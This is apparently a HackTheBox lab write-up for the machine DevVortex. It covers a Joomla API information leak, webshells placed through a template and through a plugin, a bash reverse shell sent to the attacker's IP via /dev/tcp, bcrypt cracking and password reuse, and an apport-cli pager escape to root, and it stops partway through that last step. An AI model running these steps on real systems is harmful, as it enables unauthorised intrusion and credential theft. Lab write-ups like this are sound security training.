HTB: DevVortex
==============

![DevVortex](https://0xdf.gitlab.io/img/devvortex-cover.png)

DevVortex starts with a Joomla server vulnerable to an information disclosure vulnerability. I’ll leak the users list as well as the database connection password, and use that to get access to the admin panel. Inside the admin panel, I’ll show how to get execution both by modifying a template and by writing a webshell plugin. I’ll pivot to the next user after cracking their hash from the DB. For root, I’ll abuse a pager vulnerability in apport-cli that allows escaping to a root shell when run with sudo.

## Box Info

Name[DevVortex](https://www.hackthebox.com/machines/devvortex) [![DevVortex](https://0xdf.gitlab.io/icons/box-devvortex.png)](https://www.hackthebox.com/machines/devvortex)

[Play on HackTheBox](https://www.hackthebox.com/machines/devvortex)Release Date[25 Nov 2023](https://twitter.com/hackthebox_eu/status/1727733786622705695)Retire Date27 Apr 2024OSLinux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)Base PointsEasy \[20\]Rated Difficulty![Rated difficulty for DevVortex](https://0xdf.gitlab.io/img/devvortex-diff.png)Radar Graph![Radar chart for DevVortex](https://0xdf.gitlab.io/img/devvortex-radar.png)![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)02:18:02 [![xct](https://www.hackthebox.eu/badge/image/13569)](https://app.hackthebox.com/users/13569)

![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)02:20:46 [![snowscan](https://www.hackthebox.eu/badge/image/9267)](https://app.hackthebox.com/users/9267)

Creator[![7u9y](https://www.hackthebox.eu/badge/image/260996)](https://app.hackthebox.com/users/260996)

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.242
Starting Nmap 7.80 ( https://nmap.org ) at 2024-04-20 05:22 EDT
Nmap scan report for 10.10.11.242
Host is up (0.12s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.242Starting Nmap 7.80 ( https://nmap.org ) at 2024-04-20 05:24 EDT
Nmap scan report for 10.10.11.242
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.84 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu focal 20.04.

There’s a redirect on the webserver to `http://devvortex.htb`.

### Subdomains

Given the user of host-based routing on the webserver, I’ll fuzz for any subdomains of `devvortex.htb` using `ffuf` with the following options:

- `-u http://10.10.11.242` \- Target the DevVortex webserver.
- `-H 'Host: FUZZ.devvortex.htb'` \- Specify the `Host` header, trying different subdomains.
- `-w subdomains-top1million-20000.txt` \- The wordlist of subdomains to try, from [SecLists](https://github.com/danielmiessler/SecLists).
- `-mc all` \- Match all HTTP response codes.
- `-ac` \- Auto-filter based on generic response.

```
oxdf@hacky$ ffuf -u http://10.10.11.242 -H 'Host: FUZZ.devvortex.htb' -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.242
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 166ms]
:: Progress: [19966/19966] :: Job [1/1] :: 347 req/sec :: Duration: [0:00:58] :: Errors: 0 ::

```

It finds a subdomain that responds differently from all the other requests.

I’ll add both to my `/etc/hosts` file:

```
10.10.11.242 devvortex.htb dev.devvortext.htb

```

### devvortex.htb - TCP 80

#### Site

The website is for a web design / development company:

![image-20240422182959553](https://0xdf.gitlab.io/img/image-20240422182959553.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

There is an email address at the bottom, `info@devvortex.htb`. The links to go pages like `about.html`, but they look just like the sections from the main page.

There are two forms that could take interaction. The newsletter signup takes an email, but clicking “Subscribe” just loads `contact.html` without even sending the email. The contact form also just moves to the top of the page, not even sending a request on clicking “Send”.

#### Tech Stack

The site looks to be running static HTML pages. The main page loads as `index.html`, and the links lead to `.html` pages as well. The two interactive parts are not active either.

The 404 page is the default nginx 404 page:

![image-20240422183808342](https://0xdf.gitlab.io/img/image-20240422183808342.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site to look for other paths on the webserver, giving it `-x html` to look for `.html` pages as well. It finds only the pages I already know about:

```
oxdf@hacky$ feroxbuster -u http://devvortex.htb -x html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://devvortex.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://devvortex.htb/images => http://devvortex.htb/images/
301      GET        7l       12w      178c http://devvortex.htb/css => http://devvortex.htb/css/
301      GET        7l       12w      178c http://devvortex.htb/js => http://devvortex.htb/js/
200      GET      583l     1274w    18048c http://devvortex.htb/
200      GET      289l      573w     8884c http://devvortex.htb/contact.html
200      GET      231l      545w     7388c http://devvortex.htb/about.html
200      GET      583l     1274w    18048c http://devvortex.htb/index.html
200      GET      229l      475w     6845c http://devvortex.htb/portfolio.html
200      GET      254l      520w     7603c http://devvortex.htb/do.html
[####################] - 2m    120000/120000  0s      found:9       errors:0
[####################] - 2m     30000/30000   212/s   http://devvortex.htb/
[####################] - 2m     30000/30000   213/s   http://devvortex.htb/images/
[####################] - 2m     30000/30000   213/s   http://devvortex.htb/css/
[####################] - 2m     30000/30000   212/s   http://devvortex.htb/js/

```

### dev.devvortex.htb

#### Site

The dev site is different from the main one:

![image-20240422184549565](https://0xdf.gitlab.io/img/image-20240422184549565.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

All the links go to places on the same page. There’s no forms to submit (though another email address, `contact@devvortex.htb`).

#### Tech Stack

The main site on this virtual host loads as `index.php`, so it’s running PHP. Visiting a page that doesn’t exist (like `index.html`) shows an interesting 404 message:

![image-20240422185203347](https://0xdf.gitlab.io/img/image-20240422185203347.png)

The text here looks similar to [404 pages from Joomla](https://joomla.stackexchange.com/questions/32032/joomla-administrator-page-not-entirely-loading):

![enter image description here](https://0xdf.gitlab.io/img/devvortex-o8gvv.png)

And another example [here](https://blackhillswebworks.com/2010/02/20/creating-a-custom-joomla-404-error-page/):

![Joomla 404 page](https://0xdf.gitlab.io/img/devvortex-Joomla-404-page.jpg)

Joomla’s admin page is at `/administrator/`, which does load a Joomla login form:

![image-20240422190101646](https://0xdf.gitlab.io/img/image-20240422190101646.png)

Another tell that it’s Joomla is the `robots.txt` file:

```
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/

```

The specific version of Joomla is available at `/administrator/manifests/files/joomla.xml`:

![image-20240422190257177](https://0xdf.gitlab.io/img/image-20240422190257177.png)

It’s 4.2.6.

## Shell as www-data

### CVE-2023-23752

#### Identify

Searching for “joomla 4.2.6 exploit”, the first three results are for CVE-2023-23752:

![image-20240422204744227](https://0xdf.gitlab.io/img/image-20240422204744227.png)

All of these are from Spring 2023, well before DevVortex was released.

#### Background

[CVE-2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752) is described by Nist as:

> An issue was discovered in Joomla! 4.0.0 through 4.2.7. An improper access check allows unauthorized access to webservice endpoints.

It was originally described in [this Chinese blog post](https://xz.aliyun.com/t/12175) (Google translate will do a pretty good job with it). It basically shows how there are group of Joomla APIs that effectively “merge” the query variables into where it’s storing variables (image from the blog post):

![image-20240422210020126](https://0xdf.gitlab.io/img/image-20240422210020126.png)

This is in the `parseApiRoute` function, which is responsible for handling all API requests, prepping their arguments, and passing them to the correct controller. The vulnerability is basically a mass assignment vulnerability, where the query variables are merged in and variables that shouldn’t be modified are. If the attacker specifies a GET parameter of `public`, the variable that says if the API requires authentication is overwritten with the user-supplied value and it becomes accessible, providing unauthenticated access to a bunch (well over 200) of APIs that an unauthenticated user should not have access to.

The [updated code](https://github.com/joomla/joomla-cms/blob/ac2658e7981378f9e88dca5a1673c5ed28a0d5b7/libraries/src/Router/ApiRouter.php#L104-L107) simply has a check for `public` and unsets it:

![image-20240425124714709](https://0xdf.gitlab.io/img/image-20240425124714709.png)

[This post from Vulncheck](https://vulncheck.com/blog/joomla-for-rce) goes into a discussion of how to use these information leaks to advance against a target. The most common path is to access the `config/application` API endpoint which returns the MySQL database configuration including password, and then to access MySQL. The post points out that MySQL shouldn’t be exposed to the internet, but it is a surprising amount of the time. Once in the DB, the attacker can create a user or change the password on an existing admin to get into the Joomla admin panel, and then edit a template or upload a plugin to get remote code execution (RCE).

The other attack scenario in the post is to use the `users` API end point to get the list of users, their emails, and their roles, and use this information for credential stuffing attacks.

#### Information Leaks

I’ll try the same two endpoints mentioned in the blog above. I can access it easily with `curl` (using `jq` to pretty print) or in Firefox. The `users` endpoint shows two users:

![image-20240423072754211](https://0xdf.gitlab.io/img/image-20240423072754211.png)

lewis is an admin user on the site.

The `config/application` endpoint has the MySQL DB connection information:

![image-20240423073013422](https://0xdf.gitlab.io/img/image-20240423073013422.png)

I’ll try that password for lewis and logan over SSH, but it doesn’t work.

#### Access Admin Panel

It seems that lewis does share the same password for the DB connection and their account on Joomla, as going to `/administrator` and login in works:

![image-20240423073352494](https://0xdf.gitlab.io/img/image-20240423073352494.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

### Exploitation Paths

On originally solving, I started trying to modify a template, but ran into issues and pivoted to uploading a plugin. Later I realized that the template modification was possible, so I’ll show both:

```
flowchart TD;
    A[Joomla Admin\nPanel Access]-->B(<a href='#via-template-modification'>Template Modification</a>);
    B-->C[Webshell as www-data];
    A-->D(<a href='#via-webshell-plugin'>Webshell Plugin</a>);
    D-->C;
    C-->E[Shell as www-data];

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;

```

### Via Template Modification

#### Initial Fail

The System option on the left admin panel side bar will open the System Dashboard:

![image-20240423080805631](https://0xdf.gitlab.io/img/image-20240423080805631.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

I’ll click on “Site Templates” to open the templates page:

![image-20240423080843237](https://0xdf.gitlab.io/img/image-20240423080843237.png)

Clicking on the template “Cassoiopeia Details and Files” opens the editor for that template:

![image-20240423081306430](https://0xdf.gitlab.io/img/image-20240423081306430.png)

My initial thought was to modify the `index.php` file so if my specific argument was passed, it would show my webshell output instead of the site and i could just access it from `/index.php?0xdf=id`. Clicking on `index.php` loads the source into the editor:

![image-20240423081658584](https://0xdf.gitlab.io/img/image-20240423081658584.png)

To start, I’ll just add a simple `meta` tag to make sure it shows up:

![image-20240423081745916](https://0xdf.gitlab.io/img/image-20240423081745916.png)

But on clicking save, the following error comes up:

![image-20240423081818197](https://0xdf.gitlab.io/img/image-20240423081818197.png)

It is actually good practice to not have the templates writable at the OS level by the user running the webserver, and it seems that `index.php` is not!

#### Finding Writable File

I gave up too soon and moved to the plugin, but it’s always good to check other files. I’ll open `error.php`:

![image-20240423082122071](https://0xdf.gitlab.io/img/image-20240423082122071.png)

Whereas `index.php` was mostly HTML with some `<?php>` tags mixed in, this one is more like a PHP program. I’ll test writability with `echo`, and it works:

![image-20240423082252028](https://0xdf.gitlab.io/img/image-20240423082252028.png)

Visiting a page that doesn’t exist (like `/0xdf`) raises an error page:

![image-20240423082319686](https://0xdf.gitlab.io/img/image-20240423082319686.png)

At the top of the source is the `echo` output:

![image-20240423082427377](https://0xdf.gitlab.io/img/image-20240423082427377.png)

#### Webshell

I’ll add the following PHP code to the top of `error.php`:

![image-20240423082539183](https://0xdf.gitlab.io/img/image-20240423082539183.png)

If the argument `0xdf` is passed, run it with `system` and stop, and otherwise do the page as normal. It works:

![image-20240423082619177](https://0xdf.gitlab.io/img/image-20240423082619177.png)

### Via Webshell Plugin

Before finding a writable file, I just wrote a plugin for Joomla. Searching for Joolma webshell plugins will return many perfectly good results (like [this](https://github.com/p0dalirius/Joomla-webshell-plugin)), but it’s more fun to make my own. I’ll start with [this Joomla page](https://docs.joomla.org/J4.x:Creating_a_Plugin_for_Joomla) on making Plugins, and trim it down to just what’s necessary. I’ll walk through the process in [this quick video](https://www.youtube.com/watch?v=sdF8YSPHql4):

At the end, I have a webshell:

![image-20240423150735374](https://0xdf.gitlab.io/img/image-20240423150735374.png)

### Shell

From either webshell, I’ll get a shell by running a standard [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) with it:

```
oxdf@hacky$ curl http://dev.devvortex.htb/plugins/search/webshell/evil.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"'

```

I get a connection at `nc`:

```
oxdf@hacky$ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.242 57742
bash: cannot set terminal process group (877): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devvortex:~/dev.devvortex.htb/plugins/search/webshell$

```

I’ll upgrade my shell with [the standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```
www-data@devvortex:~/dev.devvortex.htb/plugins/search/webshell$ script /dev/null -c bash
Script started, file is /dev/null
www-data@devvortex:~/dev.devvortex.htb/plugins/search/webshell$ ^Z
[1]+  Stopped                 nc -lvnp 443
oxdf@hacky$ stty raw -echo ; fg
nc -lvnp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@devvortex:~/dev.devvortex.htb/plugins/search/webshell$

```

## Shell as logan

### Enumeration

#### Home Directories

There’s only one user on this box with a home directory or a shell set:

```
www-data@devvortex:/home$ ls
logan
www-data@devvortex:/home$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
logan:x:1000:1000:,,,:/home/logan:/bin/bash

```

www-data is able to read in this directory, but the only interesting file is `user.txt`, which www-data cannot read:

```
www-data@devvortex:/home$ ls -la logan/
total 28
drwxr-xr-x 3 logan logan 4096 Nov 21 11:04 .
drwxr-xr-x 3 root  root  4096 Sep 26  2023 ..
lrwxrwxrwx 1 root  root     9 Oct 26 14:58 .bash_history -> /dev/null
-rw-r--r-- 1 logan logan  220 Sep 26  2023 .bash_logout
-rw-r--r-- 1 logan logan 3771 Sep 26  2023 .bashrc
drwx------ 2 logan logan 4096 Oct 26 15:12 .cache
-rw-r--r-- 1 logan logan  807 Sep 26  2023 .profile
-rw-r----- 1 root  logan   33 Apr 22 22:12 user.txt

```

#### SQL

There is a logan user in Joomla, and I already have the MySQL connection information from the leak of:

- Database: joomla
- User: lewis
- Password: P4ntherg0t1n5r3c0n##
- Host: localhost

I’ll connect:

```
www-data@devvortex:~$ mysql -u lewis -p'P4ntherg0t1n5r3c0n##' joomla
...[snip]...
mysql>

```

There are no other interesting databases:

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

```

There are 71 tables in `joomla`:

```
mysql> show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_associations            |
| sd4fg_banner_clients          |
| sd4fg_banner_tracks           |
| sd4fg_banners                 |
| sd4fg_categories              |
| sd4fg_contact_details         |
| sd4fg_content                 |
| sd4fg_content_frontpage       |
| sd4fg_content_rating          |
| sd4fg_content_types           |
| sd4fg_contentitem_tag_map     |
| sd4fg_extensions              |
| sd4fg_fields                  |
| sd4fg_fields_categories       |
| sd4fg_fields_groups           |
| sd4fg_fields_values           |
| sd4fg_finder_filters          |
| sd4fg_finder_links            |
| sd4fg_finder_links_terms      |
| sd4fg_finder_logging          |
| sd4fg_finder_taxonomy         |
| sd4fg_finder_taxonomy_map     |
| sd4fg_finder_terms            |
| sd4fg_finder_terms_common     |
| sd4fg_finder_tokens           |
| sd4fg_finder_tokens_aggregate |
| sd4fg_finder_types            |
| sd4fg_history                 |
| sd4fg_languages               |
| sd4fg_mail_templates          |
| sd4fg_menu                    |
| sd4fg_menu_types              |
| sd4fg_messages                |
| sd4fg_messages_cfg            |
| sd4fg_modules                 |
| sd4fg_modules_menu            |
| sd4fg_newsfeeds               |
| sd4fg_overrider               |
| sd4fg_postinstall_messages    |
| sd4fg_privacy_consents        |
| sd4fg_privacy_requests        |
| sd4fg_redirect_links          |
| sd4fg_scheduler_tasks         |
| sd4fg_schemas                 |
| sd4fg_session                 |
| sd4fg_tags                    |
| sd4fg_template_overrides      |
| sd4fg_template_styles         |
| sd4fg_ucm_base                |
| sd4fg_ucm_content             |
| sd4fg_update_sites            |
| sd4fg_update_sites_extensions |
| sd4fg_updates                 |
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+
71 rows in set (0.00 sec)

```

I’m most interested in `sd4fg_users`:

```
mysql> describe sd4fg_users;
+---------------+---------------+------+-----+---------+----------------+
| Field         | Type          | Null | Key | Default | Extra          |
+---------------+---------------+------+-----+---------+----------------+
| id            | int           | NO   | PRI | NULL    | auto_increment |
| name          | varchar(400)  | NO   | MUL |         |                |
| username      | varchar(150)  | NO   | UNI |         |                |
| email         | varchar(100)  | NO   | MUL |         |                |
| password      | varchar(100)  | NO   |     |         |                |
| block         | tinyint       | NO   | MUL | 0       |                |
| sendEmail     | tinyint       | YES  |     | 0       |                |
| registerDate  | datetime      | NO   |     | NULL    |                |
| lastvisitDate | datetime      | YES  |     | NULL    |                |
| activation    | varchar(100)  | NO   |     |         |                |
| params        | text          | NO   |     | NULL    |                |
| lastResetTime | datetime      | YES  |     | NULL    |                |
| resetCount    | int           | NO   |     | 0       |                |
| otpKey        | varchar(1000) | NO   |     |         |                |
| otep          | varchar(1000) | NO   |     |         |                |
| requireReset  | tinyint       | NO   |     | 0       |                |
| authProvider  | varchar(100)  | NO   |     |         |                |
+---------------+---------------+------+-----+---------+----------------+
17 rows in set (0.01 sec)

mysql> select name,username,password from sd4fg_users;
+------------+----------+--------------------------------------------------------------+
| name       | username | password                                                     |
+------------+----------+--------------------------------------------------------------+
| lewis      | lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan paul | logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+------------+----------+--------------------------------------------------------------+
2 rows in set (0.00 sec)

```

I’ll save those to a file:

```
oxdf@hacky$ cat joomla.hashes
lewis:$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
logan:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12

```

### Crack Hashes

I’ll pass this file to `hashcat` along with the `rockyou.txt` wordlist. It starts in auto-detect mode, but fails as there are multiple possible matches:

```
oxdf@corum:~/hackthebox/devvortex-10.10.11.242$ hashcat joomla.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
hashcat (v6.2.6) starting in autodetect mode
...[snip]...

The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce

Please specify the hash-mode with -m [hash-mode].
...[snip]...

```

Unless I know otherwise, it’s always worth trying basic bcrypt (3200). I can also start in the background registering an account and then fetching the password to try to crack it with different modes to see which it is. But I won’t need that here as 3200 works rather quickly for logan’s hash:

```
oxdf@corum:~/hackthebox/devvortex-10.10.11.242$ hashcat joomla.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user -m 3200
hashcat (v6.2.6) starting
...[snip]...
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho

```

I’ll kill this and try the DB password for lewis, and it works:

```
oxdf@corum:~/hackthebox/devvortex-10.10.11.242$ hashcat joomla.hashes sqlpass --user -m 3200
hashcat (v6.2.6) starting
...[snip]...
$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u:P4ntherg0t1n5r3c0n##
...[snip]...

```

### su / SSH

From my shell, I can run `su - logan` and enter the password to get a shell as logan:

```
www-data@devvortex:~$ su - logan
Password:
logan@devvortex:~$

```

Or I can SSH from my box:

```
oxdf@hacky$ sshpass -p tequieromucho ssh logan@devvortex.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)
...[snip]...
logan@devvortex:~$

```

Either way, I can grab `user.txt`:

```
logan@devvortex:~$ cat user.txt
219399c3************************

```

## Shell as root

### Enumeration

logan can run `apport-cli` as root with `sudo`:

```
logan@devvortex:~$ sudo -l
[sudo] password for logan:
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli

```

### Failed Attempts

My first thinking when seeing this `sudo` configuration is to look at how this application might read / write files. `apport` is the application / package that is responsible for taking actions when a program crashes on Linux. `apport-cli` is:

> **apport** automatically collects data from crashed processes and compiles a problem report in _/var/crash/_. This is a command line frontend for reporting those crashes to the developers. It can also be used to report bugs about packages or running processes.

By default, `apport-cli` looks over crashes in `/var/crash` and sends them to application developers. `/var/crash` is empty:

```
logan@devvortex:~$ ls -la /var/crash/
total 8
drwxrwxrwt  2 root root 4096 Jan 20  2021 .
drwxr-xr-x 13 root root 4096 Sep 12  2023 ..

```

Looking at the man page ( `man apport-cli`), there are a few potential interesting options:

- `-p [package]` allows for specifying a package to report against (only in `-f` mode).
- `-c [report]` allows for specifying a crash-dump file to submit.
- `--save [filename]` saves the collected information to a file rather than reporting it.

I’ll try a bunch of combinations of these, but without generating anything interesting. There is no entry to `apport-cli` in [GTFObins](https://gtfobins.github.io/#), which after a HTB box being out so long would be very surprising if that were the intended way.

### CVE-2023-1326

#### Identify

The version of `apport-cli` on DevVortex is 2.20.11:

```
logan@devvortex:~$ apport-cli --version
2.20.11

```

Searching for “apport-cli 2.20.11 exploit” returns posts about both CVE-2021-3899 and CVE-2023-1326.

Details about CVE-2021-3899 are sparce. [This POC](https://github.com/liumuqing/CVE-2021-3899_PoC) is what comes up in my search, but I don’t think the situation is useful here.

[CVE-2023-1326](https://nvd.nist.gov/vuln/detail/CVE-2023-1326) is:

> A privilege escalation attack was found in apport-cli 2.26.0 and earlier which is similar to CVE-2023-26604. If a system is specially configured to allow unprivileged users to run sudo apport-cli, less is configured as the pager, and the terminal size can be set: a local attacker can escalate privilege.

This is very similar to the vulnerability I exploited in [Sau](https://0xdf.gitlab.io/2024/01/06/htb-sau.html#exploit-less) where `systemctl` opened in `less` and I could break out.

#### Strategy

To exploit this vulnerability, I’ll need to give `apport-cli` crash data to view, and then when it shows the report in `less`, break out to a shell. I’ll show three different ways to generate crash data:

```
flowchart TD;
    A[sudo apport-cli]-->B(<a href='#crash-sleep'>Start and crash\na program with\nkill -ABRT</a>);
    B-->C(<a href='#view-and-escape'>View data in apportcli</a>);
    C-->D[Break out to root shell];
    A-->E(<a href='#with-apport-cli'>Generate data\nwith apport-cli</a>);
    E-->C;
    A-->F(<a href='#fake-data'>Create fake\ndata);
    F-->C;

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;

```

#### Crash sleep

To exploit this, I’ll need something legit to read. The easiest way is to just generate a dump file. I’ll start program running in the background:

```
logan@devvortex:~$ sleep 20 &
[1] 7650

```

`&` tells the OS to run the program in the background, and return focus to the shell. 7650 is the process id (PID) for that process. I’ll send a signal to that process to crash it with `kill -ABRT`:

```
logan@devvortex:~$ kill -ABRT 7650
logan@devvortex:~$
[1]+  Aborted                 (core dumped) sleep 20

```

The command returns (after sending the signal) and prints the next prompt, and after a slight delay, when the `sleep` process dies, it prints to the terminal. Now there’s a dump file in `/var/crash`:

```
logan@devvortex:~$ ls /var/crash/
_usr_bin_sleep.1000.crash

```

Now I can run `apport-cli` pointing to this file:

```
logan@devvortex:~$ sudo apport-cli -c /var/crash/_usr_bin_sleep.1000.crash
*** Send problem report to the developers?
After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (30.0 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C):

```

#### With apport-cli

There are alternative ways to generate dump data to look at. For example, running `apport-cli -f` will offer a menu of choices:

```
logan@devvortex:~$ sudo apport-cli -f

*** What kind of problem do you want to report?

Choices:
  1: Display (X.org)
  2: External or internal storage devices (e. g. USB sticks)
  3: Security related problems
  4: Sound/audio related problems
  5: dist-upgrade
  6: installation
  7: installer
  8: release-upgrade
  9: ubuntu-release-upgrader
  10: Other problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/9/10/C):

```

Entering “1”, brings another menu:

```
Please choose (1/2/3/4/5/6/7/8/9/10/C): 1

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.

*** What display problem do you observe?

Choices:
  1: I don't know
  2: Freezes or hangs during boot or usage
  3: Crashes or restarts back to login screen
  4: Resolution is incorrect
  5: Shows screen corruption
  6: Performance is worse than expected
  7: Fonts are the wrong size
  8: Other display-related problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/C):

```

Entering “2” here generates a report:

```
Please choose (1/2/3/4/5/6/7/8/C): 2

***

To debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/Freeze

Press any key to continue...

..dpkg-query: no packages found matching xorg
.................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.4 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C):

```

#### Fake Data

I can’t just give `apport-cli` any file, as I tried with `root.txt` and root’s `id_rsa`:

```
logan@devvortex:~$ sudo apport-cli -c /root/root.txt

*** Error: Invalid problem report

This problem report is damaged and cannot be processed.

ValueError('not enough values to unpack (expected 2, got 1)')

Press any key to continue...

```

It turns out what is requires is not much:

```
logan@devvortex:/dev/shm$ echo -e "ProblemType: Crash\nArchitecture: amd64" | tee example.crash
ProblemType: Crash
Architecture: amd64

```

That’s enough to generate a report:

```
logan@devvortex:/dev/shm$ sudo apport-cli -c ./example.crash

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (0.0 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C):

```

#### View and Escape

Regardless of how I got to this menu, here I’ll enter “V”:

```
What would you like to do? Your options are:
  S: Send report (0.0 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
